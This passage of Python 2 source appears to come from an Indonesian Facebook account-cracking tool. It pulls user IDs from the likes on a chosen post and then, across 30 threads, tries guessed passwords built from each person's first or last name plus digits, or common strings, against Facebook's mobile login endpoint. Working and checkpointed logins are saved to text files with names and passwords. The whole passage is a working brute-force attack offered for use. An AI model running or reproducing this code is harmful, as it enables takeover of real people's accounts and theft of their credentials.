                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/korea.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/korea.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'salanghae'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/korea.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/korea.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'salanghae'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/korea.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/korea.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/korea.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/korea.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['first_name'].lower() + '12345'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/korea.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/korea.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '1234'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/korea.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/korea.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone korea.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_likes():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token Invalid!'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.system('clear')
        print ' '
        print '\x1b[0;95m  ____           _   '
        print '\x1b[0;95m |  _ \\ ___  ___| |_ \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
        print '\x1b[0;95m | |_) / _ \\/ __| __|\x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
        print '\x1b[0;95m |  __/ (_) \\__ \\ |_ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
        print '\x1b[0;95m |_|   \\___/|___/\\__| '
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        print '         \x1b[1;94m>>> \x1b[1;93mCRACK POSTINGAN TEMAN\x1b[1;94m <<<'
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        tez = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m)\x1b[1;97m ID Postingan Teman \x1b[1;91m :\x1b[1;97m ')
        r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=9999999&access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

        jalan('\r\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mMengambil ID \x1b[1;94m...')
    except KeyError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID Postingan Salah !'
        raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
        menu()

    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/post.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/post.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/post.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/post.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '1234'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/post.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/post.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = '123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/post.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/post.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/post.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/post.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
